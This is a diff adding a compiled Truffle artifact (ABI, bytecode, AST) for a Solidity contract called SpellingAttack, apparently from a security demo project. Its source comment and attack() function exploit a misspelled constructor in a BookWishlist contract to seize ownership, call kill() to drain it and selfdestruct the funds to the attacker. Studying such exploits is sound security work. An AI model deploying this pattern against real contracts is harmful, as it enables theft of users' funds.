@@ -1,0 +1,624 @@
+{
+  "contractName": "SpellingAttack",
+  "abi": [
+    {
+      "constant": false,
+      "inputs": [],
+      "name": "attack",
+      "outputs": [],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "name": "_t",
+          "type": "address"
+        }
+      ],
+      "payable": true,
+      "stateMutability": "payable",
+      "type": "constructor"
+    }
+  ],
+  "bytecode": "0x60606040526040516020806102a383398101604052808051906020019091905050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506101f2806100b16000396000f300606060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680639e5faafc14610046575b600080fd5b341561005157600080fd5b61005961005b565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d86f0d566040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15156100df57600080fd5b6102c65a03f115156100f057600080fd5b5050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166341c0e1b56040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561017757600080fd5b6102c65a03f1151561018857600080fd5b505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff00a165627a7a72305820c3e71fe935bdf8c5661e6b3793bcb7258bbbdc02821cf50512a3cfe43436262e0029",
+  "deployedBytecode": "0x606060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680639e5faafc14610046575b600080fd5b341561005157600080fd5b61005961005b565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d86f0d566040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15156100df57600080fd5b6102c65a03f115156100f057600080fd5b5050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166341c0e1b56040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561017757600080fd5b6102c65a03f1151561018857600080fd5b505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff00a165627a7a72305820c3e71fe935bdf8c5661e6b3793bcb7258bbbdc02821cf50512a3cfe43436262e0029",
+  "sourceMap": "261:389:5:-;;;336:121;;;;;;;;;;;;;;;;;;;;;;419:2;397:6;;:25;;;;;;;;;;;;;;;;;;440:10;432:5;;:18;;;;;;;;;;;;;;;;;;336:121;261:389;;;;;;",
+  "deployedSourceMap": "261:389:5:-;;;;;;;;;;;;;;;;;;;;;;;;534:114;;;;;;;;;;;;;;;569:6;;;;;;;;;;;:18;;;:20;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;599:6;;;;;;;;;;;:11;;;:13;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;635:5;;;;;;;;;;;622:19;;",
+  "source": "pragma solidity ^0.4.18;\n\nimport \"./BookWishlist.sol\";\n\n/*\n * This contract is constructed to take advantage of a spelling\n * mistake in the BookWishlist constructor. It allows an attacker\n * to take ownership of the contract, drain it and steal the funds.\n */\ncontract SpellingAttack {\n    BookWishlist target;\n    address owner;\n\n    function SpellingAttack(address _t) public payable {\n        target = BookWishlist(_t);\n        owner = msg.sender;\n    }\n\n    // Exploit misspelled contructor, steal funds and forward to owner\n    function attack() public {\n        target.BookWishlit();\n        target.kill();\n        selfdestruct(owner);\n    }\n}\n",
+  "sourcePath": "/Users/Chase/security/ExampleDapp/contracts/SpellingAttack.sol",
+  "ast": {
+    "attributes": {
+      "absolutePath": "/Users/Chase/security/ExampleDapp/contracts/SpellingAttack.sol",
+      "exportedSymbols": {
+        "SpellingAttack": [
+          786
+        ]
+      }
+    },
+    "children": [
+      {
+        "attributes": {
+          "literals": [
+            "solidity",
+            "^",
+            "0.4",
+            ".18"
+          ]
+        },
+        "id": 745,
+        "name": "PragmaDirective",
+        "src": "0:24:5"
+      },
+      {
+        "attributes": {
+          "SourceUnit": 437,
+          "absolutePath": "/Users/Chase/security/ExampleDapp/contracts/BookWishlist.sol",
+          "file": "./BookWishlist.sol",
+          "scope": 787,
+          "symbolAliases": [
+            null
+          ],
+          "unitAlias": ""
+        },
+        "id": 746,
+        "name": "ImportDirective",
+        "src": "26:28:5"
+      },
+      {
+        "attributes": {
+          "baseContracts": [
+            null
+          ],
+          "contractDependencies": [
+            null
+          ],
+          "contractKind": "contract",
+          "documentation": null,
+          "fullyImplemented": true,
+          "linearizedBaseContracts": [
+            786
+          ],
+          "name": "SpellingAttack",
+          "scope": 787
+        },
+        "children": [
+          {
+            "attributes": {
+              "constant": false,
+              "name": "target",
+              "scope": 786,
+              "stateVariable": true,
+              "storageLocation": "default",
+              "type": "contract BookWishlist",
+              "value": null,
+              "visibility": "internal"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "contractScope": null,
+                  "name": "BookWishlist",
+                  "referencedDeclaration": 436,
+                  "type": "contract BookWishlist"
+                },
+                "id": 747,
+                "name": "UserDefinedTypeName",
+                "src": "291:12:5"
+              }
+            ],
+            "id": 748,
+            "name": "VariableDeclaration",
+            "src": "291:19:5"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "name": "owner",
+              "scope": 786,
+              "stateVariable": true,
+              "storageLocation": "default",
+              "type": "address",
+              "value": null,
+              "visibility": "internal"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "name": "address",
+                  "type": "address"
+                },
+                "id": 749,
+                "name": "ElementaryTypeName",
+                "src": "316:7:5"
+              }
+            ],
+            "id": 750,
+            "name": "VariableDeclaration",
+            "src": "316:13:5"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "implemented": true,
+              "isConstructor": true,
+              "modifiers": [
+                null
+              ],
+              "name": "SpellingAttack",
+              "payable": true,
+              "scope": 786,
+              "stateMutability": "payable",
+              "superFunction": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "children": [
+                  {
+                    "attributes": {
+                      "constant": false,
+                      "name": "_t",
+                      "scope": 767,
+                      "stateVariable": false,
+                      "storageLocation": "default",
+                      "type": "address",
+                      "value": null,
+                      "visibility": "internal"
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "name": "address",
+                          "type": "address"
+                        },
+                        "id": 751,
+                        "name": "ElementaryTypeName",
+                        "src": "360:7:5"
+                      }
+                    ],
+                    "id": 752,
+                    "name": "VariableDeclaration",
+                    "src": "360:10:5"
+                  }
+                ],
+                "id": 753,
+                "name": "ParameterList",
+                "src": "359:12:5"
+              },
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 754,
+                "name": "ParameterList",
+                "src": "387:0:5"
+              },
+              {
+                "children": [
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "operator": "=",
+                          "type": "contract BookWishlist"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 748,
+                              "type": "contract BookWishlist",
+                              "value": "target"
+                            },
+                            "id": 755,
+                            "name": "Identifier",
+                            "src": "397:6:5"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "isStructConstructorCall": false,
+                              "lValueRequested": false,
+                              "names": [
+                                null
+                              ],
+                              "type": "contract BookWishlist",
+                              "type_conversion": true
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": [
+                                    {
+                                      "typeIdentifier": "t_address",
+                                      "typeString": "address"
+                                    }
+                                  ],
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 436,
+                                  "type": "type(contract BookWishlist)",
+                                  "value": "BookWishlist"
+                                },
+                                "id": 756,
+                                "name": "Identifier",
+                                "src": "406:12:5"
+                              },
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 752,
+                                  "type": "address",
+                                  "value": "_t"
+                                },
+                                "id": 757,
+                                "name": "Identifier",
+                                "src": "419:2:5"
+                              }
+                            ],
+                            "id": 758,
+                            "name": "FunctionCall",
+                            "src": "406:16:5"
+                          }
+                        ],
+                        "id": 759,
+                        "name": "Assignment",
+                        "src": "397:25:5"
+                      }
+                    ],
+                    "id": 760,
+                    "name": "ExpressionStatement",
+                    "src": "397:25:5"
+                  },
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "operator": "=",
+                          "type": "address"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 750,
+                              "type": "address",
+                              "value": "owner"
+                            },
+                            "id": 761,
+                            "name": "Identifier",
+                            "src": "432:5:5"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "lValueRequested": false,
+                              "member_name": "sender",
+                              "referencedDeclaration": null,
+                              "type": "address"
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 798,
+                                  "type": "msg",
+                                  "value": "msg"
+                                },
+                                "id": 762,
+                                "name": "Identifier",
+                                "src": "440:3:5"
+                              }
+                            ],
+                            "id": 763,
+                            "name": "MemberAccess",
+                            "src": "440:10:5"
+                          }
+                        ],
+                        "id": 764,
+                        "name": "Assignment",
+                        "src": "432:18:5"
+                      }
+                    ],
+                    "id": 765,
+                    "name": "ExpressionStatement",
+                    "src": "432:18:5"
+                  }
+                ],
+                "id": 766,
+                "name": "Block",
+                "src": "387:70:5"
+              }
+            ],
+            "id": 767,
+            "name": "FunctionDefinition",
+            "src": "336:121:5"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "implemented": true,
+              "isConstructor": false,
+              "modifiers": [
+                null
+              ],
+              "name": "attack",
+              "payable": false,
+              "scope": 786,
+              "stateMutability": "nonpayable",
+              "superFunction": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 768,
+                "name": "ParameterList",
+                "src": "549:2:5"
+              },
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 769,
+                "name": "ParameterList",
+                "src": "559:0:5"
+              },
+              {
+                "children": [
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "arguments": [
+                            null
+                          ],
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "isStructConstructorCall": false,
+                          "lValueRequested": false,
+                          "names": [
+                            null
+                          ],
+                          "type": "tuple()",
+                          "type_conversion": false
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": [
+                                null
+                              ],
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "lValueRequested": false,
+                              "member_name": "BookWishlit",
+                              "referencedDeclaration": 51,
+                              "type": "function () external"
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 748,
+                                  "type": "contract BookWishlist",
+                                  "value": "target"
+                                },
+                                "id": 770,
+                                "name": "Identifier",
+                                "src": "569:6:5"
+                              }
+                            ],
+                            "id": 772,
+                            "name": "MemberAccess",
+                            "src": "569:18:5"
+                          }
+                        ],
+                        "id": 773,
+                        "name": "FunctionCall",
+                        "src": "569:20:5"
+                      }
+                    ],
+                    "id": 774,
+                    "name": "ExpressionStatement",
+                    "src": "569:20:5"
+                  },
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "arguments": [
+                            null
+                          ],
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "isStructConstructorCall": false,
+                          "lValueRequested": false,
+                          "names": [
+                            null
+                          ],
+                          "type": "tuple()",
+                          "type_conversion": false
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": [
+                                null
+                              ],
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "lValueRequested": false,
+                              "member_name": "kill",
+                              "referencedDeclaration": 347,
+                              "type": "function () external"
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 748,
+                                  "type": "contract BookWishlist",
+                                  "value": "target"
+                                },
+                                "id": 775,
+                                "name": "Identifier",
+                                "src": "599:6:5"
+                              }
+                            ],
+                            "id": 777,
+                            "name": "MemberAccess",
+                            "src": "599:11:5"
+                          }
+                        ],
+                        "id": 778,
+                        "name": "FunctionCall",
+                        "src": "599:13:5"
+                      }
+                    ],
+                    "id": 779,
+                    "name": "ExpressionStatement",
+                    "src": "599:13:5"
+                  },
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "isStructConstructorCall": false,
+                          "lValueRequested": false,
+                          "names": [
+                            null
+                          ],
+                          "type": "tuple()",
+                          "type_conversion": false
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": [
+                                {
+                                  "typeIdentifier": "t_address",
+                                  "typeString": "address"
+                                }
+                              ],
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 804,
+                              "type": "function (address)",
+                              "value": "selfdestruct"
+                            },
+                            "id": 780,
+                            "name": "Identifier",
+                            "src": "622:12:5"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 750,
+                              "type": "address",
+                              "value": "owner"
+                            },
+                            "id": 781,
+                            "name": "Identifier",
+                            "src": "635:5:5"
+                          }
+                        ],
+                        "id": 782,
+                        "name": "FunctionCall",
+                        "src": "622:19:5"
+                      }
+                    ],
+                    "id": 783,
+                    "name": "ExpressionStatement",
+                    "src": "622:19:5"
+                  }
+                ],
+                "id": 784,
+                "name": "Block",
+                "src": "559:89:5"
+              }
+            ],
+            "id": 785,
+            "name": "FunctionDefinition",
+            "src": "534:114:5"
+          }
+        ],
+        "id": 786,
+        "name": "ContractDefinition",
+        "src": "261:389:5"
+      }
+    ],
+    "id": 787,
+    "name": "SourceUnit",
+    "src": "0:651:5"
+  },
+  "compiler": {
+    "name": "solc",
+    "version": "0.4.18+commit.9cf6e910.Emscripten.clang"
+  },
+  "networks": {},
+  "schemaVersion": "1.0.1",
+  "updatedAt": "2017-12-14T00:58:23.977Z"
+}
